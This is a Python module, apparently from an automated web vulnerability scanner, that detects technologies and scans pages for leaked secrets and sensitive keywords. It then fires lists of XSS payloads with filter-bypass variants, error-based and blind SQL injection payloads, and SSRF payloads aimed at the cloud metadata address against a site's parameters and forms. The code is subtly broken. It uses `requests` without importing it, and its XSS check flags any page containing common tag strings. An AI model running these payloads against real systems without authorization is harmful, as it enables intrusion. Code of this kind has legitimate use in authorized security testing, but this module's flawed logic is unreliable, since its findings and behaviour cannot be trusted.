"""
Pipeline 3 — AI Engine.
Análise global, priorização inteligente, foco dinâmico e geração de insights.
"""
import re
from core.utils import print_status, safe_request
from modules.ai.learning_engine import LearningEngine
from modules.ai.risk_engine import RiskEngine
from modules.ai.evidence_engine import enrich_finding

# Padrões para análise de conteúdo
SENSITIVE_KEYWORDS = {
    "CRITICAL": ["-----BEGIN PRIVATE KEY", "-----BEGIN RSA PRIVATE KEY",
                 "AKIA", "password=", "secret=", "private_key"],
    "HIGH":     ["token", "api_key", "apikey", "authorization", "bearer",
                 "admin", "root", "sudo", "database_url"],
    "MEDIUM":   ["password", "passwd", "credential", "login", "auth", "session"],
    "LOW":      ["debug", "test", "todo", "fixme"],
}

SECRET_PATTERNS = {
    "AWS Access Key":    r"AKIA[0-9A-Z]{16}",
    "Google API Key":    r"AIza[0-9A-Za-z\-_]{35}",
    "Stripe Live Key":   r"sk_live_[0-9a-zA-Z]{24,}",
    "GitHub Token":      r"ghp_[A-Za-z0-9]{36}",
    "Slack Token":       r"xox[baprs]-[0-9A-Za-z\-]+",
    "JWT Token":         r"eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+",
    "Generic API Key":   r"(?i)(api_key|apikey|api-key)\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{20,})['\"]?",
    "DB Connection":     r"(mongodb|postgres|postgresql|mysql|redis):\/\/[^\s'\"<>]+",
    "Private Key Block": r"-----BEGIN (RSA |OPENSSH |EC |PGP )?PRIVATE KEY-----",
    "Supabase Key":      r"eyJ[A-Za-z0-9\-_]{50,}\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+",
}

TECH_SIGNATURES = {
    "React":      ["__reactFiber","react.production.min.js","react-dom"],
    "Next.js":    ["__NEXT_DATA__","_next/static"],
    "Vue.js":     ["__vue__","vue.min.js","vue.runtime"],
    "Angular":    ["ng-version","angular.min.js"],
    "jQuery":     ["jquery.min.js","jquery-","$.fn.jquery"],
    "Bootstrap":  ["bootstrap.min.css","bootstrap.bundle"],
    "WordPress":  ["wp-content/","wp-includes/","wp-login.php"],
    "Laravel":    ["laravel_session","X-Powered-By: Laravel"],
    "Django":     ["csrfmiddlewaretoken"],
    "Firebase":   ["firebase","firebaseapp.com"],
    "Supabase":   ["supabase.co","supabase"],
    "PHP":        ["X-Powered-By: PHP",".php"],
    "Apache":     ["Server: Apache"],
    "Nginx":      ["Server: nginx"],
    "Cloudflare": ["cf-ray","cloudflare"],
}

XSS_PAYLOADS = [
    # Básicos
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    # Case variation (bypass filtros case-sensitive)
    "<ScRiPt>alert(1)</ScRiPt>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    # SVG (bypass filtros que só bloqueiam <script>/<img>)
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    # URL encoded (bypass WAFs básicos)
    "%3Cscript%3Ealert(1)%3C/script%3E",
    # Double encoded
    "%253Cscript%253Ealert(1)%253C/script%253E",
    # Sem espaços (bypass filtros de espaço)
    "<script>alert`1`</script>",
    # Evento alternativo
    "<body onresize=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]

# Strings que indicam XSS refletido mesmo com encode parcial
XSS_REFLECTION_INDICATORS = [
    "alert(1)", "alert`1`",
    "onerror=", "onload=", "onfocus=", "onresize=",
    "<script>", "<svg", "<img src=x",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' UNION SELECT null,null--",
    "' AND 1=CAST((SELECT version()) AS INT)--",
    # Error-based MySQL
    "' AND extractvalue(1,concat(0x7e,version()))--",
    # Error-based MSSQL
    "' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
]

# Pares (true_payload, false_payload) para blind boolean
SQLI_BLIND_PAIRS = [
    ("' AND 1=1--",      "' AND 1=2--"),
    ("' AND 'a'='a'--",  "' AND 'a'='b'--"),
    ("1 AND 1=1",        "1 AND 1=2"),
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "postgresql",
    "sqlite", "syntax error", "unclosed quotation",
    "mysql_num_rows", "pg_query", "sqlstate",
    "warning: mysql", "valid mysql result", "mysqlclient",
    "com.mysql.jdbc", "org.hibernate", "jdbc.mysql",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://0.0.0.0",
]

COMMON_PARAMS = [
    "q", "search", "s", "query", "id", "page", "user",
    "url", "redirect", "next", "file", "path", "src", "href",
    "input", "data", "text", "value", "name", "email",
    "username", "password", "token", "key", "lang", "cat",
]


class AIEngine:
    def __init__(self, target, context):
        self.target   = target
        self.context  = context
        self.learning = LearningEngine()
        self.risk     = RiskEngine()
        self.results  = {
            "secrets":         [],
            "smart_analysis":  [],
            "technologies":    [],
            "exploitation":    [],
            "insights":        [],
            "prioritized":     [],
            "top_issues":      [],
        }

    # ── 1. Detecção de tecnologias ────────────────────────────────────────────
    def detect_technologies(self, pages, headers):
        techs = set()
        headers_str = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()
        for page in pages:
            html = page["html"].lower()
            for tech, sigs in TECH_SIGNATURES.items():
                for sig in sigs:
                    if sig.lower() in html or sig.lower() in headers_str:
                        techs.add(tech)
        self.results["technologies"] = sorted(techs)
        print_status(f"Tecnologias: {self.results['technologies']}", "SUCCESS")

    # ── 2. Secret Scanner ─────────────────────────────────────────────────────
    def scan_secrets(self, pages):
        print_status("IA: Scanning secrets...", "INFO")
        seen = set()
        for page in pages:
            for label, pattern in SECRET_PATTERNS.items():
                for match in re.finditer(pattern, page["html"]):
                    raw = match.group(0)
                    val = raw
                    if match.lastindex:
                        for i in range(match.lastindex, 0, -1):
                            if match.group(i):
                                val = match.group(i)
                                break
                    key = f"{label}:{val[:30]}"
                    if key in seen:
                        continue
                    seen.add(key)
                    finding = {
                        "type": label, "value": val[:80],
                        "url": page["url"], "severity": "CRITICAL",
                        "source": "AI:SecretScanner"
                    }
                    self.results["secrets"].append(finding)
                    self.context.add_finding({**finding, "issue": f"Secret exposto: {label}"})
                    print_status(f"[CRÍTICO] {label} em {page['url']}", "CRIT")

    # ── 3. Smart Analyzer ─────────────────────────────────────────────────────
    def smart_analyze(self, pages):
        print_status("IA: Análise heurística...", "INFO")
        for page in pages:
            content = page["html"]
            content_lower = content.lower()
            for severity, keywords in SENSITIVE_KEYWORDS.items():
                for kw in keywords:
                    if kw.lower() in content_lower:
                        f = {
                            "url": page["url"],
                            "issue": f"Keyword sensível: '{kw}'",
                            "severity": severity,
                            "source": "AI:SmartAnalyzer"
                        }
                        self.results["smart_analysis"].append(f)
                        self.context.add_finding(f)
                        break

    # ── 4. Exploitation ───────────────────────────────────────────────────────
    def _req(self, url, param, payload, method="GET"):
        try:
            if method == "GET":
                return requests.get(url, params={param: payload}, timeout=8, verify=False,
                                    headers={"User-Agent": "Mozilla/5.0"})
            return requests.post(url, data={param: payload}, timeout=8, verify=False,
                                 headers={"User-Agent": "Mozilla/5.0"})
        except Exception:
            return None

    def _check_xss_reflection(self, payload: str, response_text: str) -> bool:
        """Detecta XSS refletido mesmo com encode parcial ou variação de case."""
        # Refletiu literal
        if payload in response_text:
            return True
        # Algum indicador crítico apareceu na resposta (encode parcial)
        rt_lower = response_text.lower()
        for indicator in XSS_REFLECTION_INDICATORS:
            if indicator.lower() in rt_lower:
                return True
        return False

    def _collect_real_targets(self, pages: list) -> list[dict]:
        """
        Melhoria 4: coleta alvos reais para teste combinando:
        - URLs com query params descobertas pelo crawler
        - URL base com COMMON_PARAMS genéricos (fallback)
        Retorna lista de {"url": str, "param": str, "base_url": str}
        """
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        targets = []
        seen = set()

        # Prioridade 1: params reais encontrados nas páginas crawleadas
        for page in pages:
            parsed = urlparse(page["url"])
            if not parsed.query:
                continue
            real_params = list(parse_qs(parsed.query).keys())
            # URL limpa sem query (vai reinjetar o param)
            base = urlunparse(parsed._replace(query="", fragment=""))
            for param in real_params:
                key = f"{base}|{param}"
                if key not in seen:
                    seen.add(key)
                    targets.append({"base_url": base, "param": param, "source": "crawler"})

        # Prioridade 2: params genéricos no target raiz (fallback)
        for param in COMMON_PARAMS:
            key = f"{self.target}|{param}"
            if key not in seen:
                seen.add(key)
                targets.append({"base_url": self.target, "param": param, "source": "generic"})

        real_count = sum(1 for t in targets if t["source"] == "crawler")
        print_status(f"Exploiter: {real_count} params reais do crawler + {len(COMMON_PARAMS)} genéricos", "INFO")
        return targets

    def _test_sqli_blind(self, base_url: str, param: str) -> bool:
        """SQLi blind boolean: compara resposta true vs false payload."""
        for true_p, false_p in SQLI_BLIND_PAIRS:
            r_true  = self._req(base_url, param, true_p, "GET")
            r_false = self._req(base_url, param, false_p, "GET")
            if not r_true or not r_false:
                continue
            # Comportamento diferente entre true e false = blind SQLi
            len_diff = abs(len(r_true.text) - len(r_false.text))
            status_diff = r_true.status_code != r_false.status_code
            if len_diff > 50 or status_diff:
                return True
        return False

    def test_exploitation(self, pages):
        print_status("IA: Testes de exploração...", "INFO")

        # Melhoria 4: coleta alvos reais do crawler + genéricos
        targets = self._collect_real_targets(pages)

        for target in targets:
            base_url = target["base_url"]
            param    = target["param"]

            # ── XSS (Melhoria 3: payloads expandidos + check melhorado) ──────
            xss_found = False
            for payload in XSS_PAYLOADS:
                if xss_found:
                    break
                for method in ("GET", "POST"):
                    r = self._req(base_url, param, payload, method)
                    if r and self._check_xss_reflection(payload, r.text):
                        f = {
                            "type": "XSS Refletido", "method": method, "param": param,
                            "payload": payload, "url": base_url, "severity": "HIGH",
                            "source": "AI:Exploiter",
                            "param_source": target["source"],  # "crawler" ou "generic"
                        }
                        self.results["exploitation"].append(f)
                        self.context.add_finding({**f, "issue": "XSS Refletido"})
                        print_status(f"XSS em {param} [{method}] ({base_url})", "CRIT")
                        xss_found = True
                        break

            # ── SQLi Error-Based ──────────────────────────────────────────────
            sqli_found = False
            for payload in SQLI_PAYLOADS:
                if sqli_found:
                    break
                for method in ("GET", "POST"):
                    r = self._req(base_url, param, payload, method)
                    if not r:
                        continue
                    if any(e in r.text.lower() for e in SQLI_ERRORS):
                        f = {
                            "type": "SQLi Error-Based", "method": method, "param": param,
                            "payload": payload, "url": base_url, "severity": "CRITICAL",
                            "source": "AI:Exploiter", "param_source": target["source"],
                        }
                        self.results["exploitation"].append(f)
                        self.context.add_finding({**f, "issue": "SQL Injection"})
                        print_status(f"SQLi Error-Based em {param} [{method}] ({base_url})", "CRIT")
                        sqli_found = True
                        break
                    elif r.status_code == 500:
                        f = {
                            "type": "SQLi (HTTP 500)", "method": method, "param": param,
                            "payload": payload, "url": base_url, "severity": "MEDIUM",
                            "source": "AI:Exploiter", "param_source": target["source"],
                        }
                        self.results["exploitation"].append(f)
                        self.context.add_finding({**f, "issue": "Possível SQLi"})

            # ── SQLi Blind Boolean (novo) ─────────────────────────────────────
            if not sqli_found:
                if self._test_sqli_blind(base_url, param):
                    f = {
                        "type": "SQLi Blind Boolean", "param": param,
                        "url": base_url, "severity": "HIGH",
                        "source": "AI:Exploiter", "param_source": target["source"],
                        "detail": "Resposta diferente entre payload TRUE e FALSE",
                    }
                    self.results["exploitation"].append(f)
                    self.context.add_finding({**f, "issue": "SQLi Blind"})
                    print_status(f"SQLi Blind em {param} ({base_url})", "CRIT")

        # ── SSRF ─────────────────────────────────────────────────────────────
        for target in targets:
            if target["param"] not in ["url", "redirect", "next", "src", "href", "path"]:
                continue
            for payload in SSRF_PAYLOADS:
                try:
                    r = requests.get(target["base_url"],
                                     params={target["param"]: payload},
                                     allow_redirects=False, timeout=6, verify=False)
                    if r and r.status_code == 200 and len(r.text) > 100:
                        f = {
                            "type": "Possível SSRF", "param": target["param"],
                            "payload": payload, "url": target["base_url"],
                            "severity": "HIGH", "source": "AI:Exploiter",
                        }
                        self.results["exploitation"].append(f)
                        self.context.add_finding({**f, "issue": "SSRF"})
                        print_status(f"SSRF via {target['param']} ({target['base_url']})", "CRIT")
                        break
                except Exception:
                    pass

        # ── Forms descobertos pelo crawler ────────────────────────────────────
        for page in pages:
            for form in page.get("forms", []):
                action = form["action"]
                method = form["method"]
                inputs = form["inputs"]
                for field in inputs:
                    for payload in XSS_PAYLOADS[:4]:  # primeiros 4 já cobrem os principais vetores
                        try:
                            data = {inp: payload for inp in inputs}
                            r = requests.request(
                                method, action,
                                data=data if method == "POST" else None,
                                params=data if method == "GET" else None,
                                timeout=8, verify=False,
                            )
                            if r and self._check_xss_reflection(payload, r.text):
                                f_data = {
                                    "type": "XSS em Form", "method": method, "param": field,
                                    "payload": payload, "url": action, "severity": "HIGH",
                                    "source": "AI:FormTester",
                                }
                                self.results["exploitation"].append(f_data)
                                self.context.add_finding({**f_data, "issue": "XSS em Form"})
                                print_status(f"XSS em form field '{field}' ({action})", "CRIT")
                                break
                        except Exception:
                            pass

    # ── 5. Priorização inteligente + Insights ─────────────────────────────────
    def prioritize_and_learn(self):
        print_status("IA: Priorizando e gerando insights...", "INFO")
        all_f = self.context.all_findings()

        # Aprende com todos os issues
        for f in all_f:
            issue = f.get("issue") or f.get("type","")
            self.learning.learn(issue)

        # Prioriza
        prioritized = self.risk.prioritize(all_f)
        self.results["prioritized"] = prioritized[:60]

        top = self.learning.top_issues(8)
        self.results["top_issues"] = [{"issue": k, "count": v} for k, v in top]

        # Gera insights automáticos
        insights = []
        crit_count = sum(1 for f in prioritized if f.get("severity")=="CRITICAL")
        if crit_count > 0:
            insights.append(f"🔴 {crit_count} finding(s) CRÍTICO(s) — requerem atenção imediata antes de qualquer deploy.")

        if any("sqli" in (f.get("issue","") or f.get("type","")).lower() for f in prioritized):
            insights.append("💣 SQL Injection detectado — risco de exfiltração completa do banco de dados.")

        if any("secret" in (f.get("issue","") or f.get("type","")).lower() for f in prioritized):
            insights.append("🔑 Secrets expostos no frontend — rotacionar imediatamente todas as chaves afetadas.")

        if any("ssrf" in (f.get("issue","") or f.get("type","")).lower() for f in prioritized):
            insights.append("🌐 SSRF detectado — possível acesso a infraestrutura interna ou metadata de cloud.")

        if any("traversal" in (f.get("issue","") or "").lower() for f in prioritized):
            insights.append("📁 Path Traversal confirmado — leitura de arquivos arbitrários no servidor.")

        recurring = [k for k,v in top if v >= 2]
        if recurring:
            insights.append(f"🔁 Issues recorrentes entre scans: {', '.join(recurring[:3])} — padrão sistêmico.")

        self.results["insights"] = insights
        for ins in insights:
            print_status(ins, "WARN")

    # ── Run completo ──────────────────────────────────────────────────────────
    def run(self, pages, headers):
        self.detect_technologies(pages, headers)
        self.scan_secrets(pages)
        self.smart_analyze(pages)
        self.test_exploitation(pages)
        self.prioritize_and_learn()
        return self.results


def run_ai(target, context, pages, headers):
    """Entrypoint Pipeline 3."""
    print_status("[PIPELINE 3] AI Engine", "CRIT")
    engine = AIEngine(target, context)
    return engine.run(pages, headers)
